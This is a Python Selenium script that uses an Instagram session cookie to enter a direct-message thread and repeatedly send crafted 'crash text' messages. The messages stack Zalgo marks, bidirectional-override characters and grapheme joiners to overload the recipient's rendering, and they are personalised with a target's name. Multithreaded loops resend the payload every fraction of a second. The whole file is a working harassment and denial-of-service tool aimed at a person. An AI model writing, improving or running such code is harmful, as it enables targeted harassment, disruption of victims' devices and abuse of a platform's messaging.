# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (V100-EXTREME)
# 📅 STATUS: ATOMIC RENDERING | DENSITY x12 | 10-AGENT WAVE

import os, time, random, threading, sys, gc, tempfile
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- MATRIX CONFIG ---
THREADS = 2
SESSION_LIMIT = 240 # Increased session life
MACHINE_ID = os.getenv("MACHINE_ID", "1")

def get_extreme_impact_payload(target_name):
    """The V100-Extreme: Layout Buffer Overflow & Grapheme Joining."""
    header = f"👑 𝖯𝖱𝖠𝖵𝖤𝖤𝖱 𝖯𝖠𝖯𝖠 👑 TOTAL LOCKDOWN: {target_name.upper()}\n"
    
    # 💥 THE 'GRAPHEME JOINER' (U+034F)
    # Forces the layout engine to process the 10k block as one unbreakable unit.
    joiner = "\u034F" * 15
    
    # 💥 PLANE-1 FRAKTUR (Vector Complexity)
    vector_chaos = "𝔓𝔄𝔙𝔈𝔈𝔔 𝔓𝔄𝔓𝔄 " * 5
    
    # 💥 DENSITY x12 (120 marks per character)
    # This is the 'Yesterday Heavy' feel.
    z_tower = "̸" * 120
    
    # 💥 BiDi RECURSION (Deep Directional Stacking)
    # Target: Firefox/Safari rendering queue.
    bidi_stack = "\u202E\u2066\u202D\u2067\u202B\u2068" * 10

    lines = [header, vector_chaos]
    
    # 💥 70 Lines of Atomic Skyscraper
    for i in range(70):
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        # We sandwich the target name between joiners and 120-mark Zalgo
        lines.append(f"{prefix}{joiner}{target_name.upper()}_VOID{z_tower}{bidi_stack}")
    
    return "\n".join(lines)[:9990]

def get_driver(agent_id):
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920,1080")
    # 2026 Stealth User-Agent
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
    return webdriver.Chrome(options=chrome_options)

def run_life_cycle(agent_id, cookie, target_id, target_name):
    while True:
        driver = None
        try:
            print(f"[M{MACHINE_ID}-A{agent_id}] ⚡ V100-EXTREME DEPLOYED...", flush=True)
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(7)
            driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
            time.sleep(12)

            session_start = time.time()
            while (time.time() - session_start) < SESSION_LIMIT:
                try:
                    box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
                    
                    # 🔥 THE 'WAVE' SPEED: Continuous Main-Thread Pressure
                    payload = get_extreme_impact_payload(target_name)
                    driver.execute_script("""
                        var el = arguments[0];
                        document.execCommand('insertText', false, arguments[1]);
                        el.dispatchEvent(new Event('input', { bubbles: true }));
                    """, box, payload)
                    
                    box.send_keys(Keys.ENTER)
                    
                    print(f"[M{MACHINE_ID}-A{agent_id}] 💀 EXTREME IMPACT DELIVERED", flush=True)
                    time.sleep(random.uniform(0.05, 0.15)) 
                    
                except:
                    time.sleep(5)
                    break 
        except Exception: pass
        finally:
            if driver: driver.quit()
            gc.collect()
            time.sleep(3)

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()
    if not cookie or not target_id: sys.exit(1)
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS):
            executor.submit(run_life_cycle, i+1, cookie, target_id, target_name)

if __name__ == "__main__":
    main()
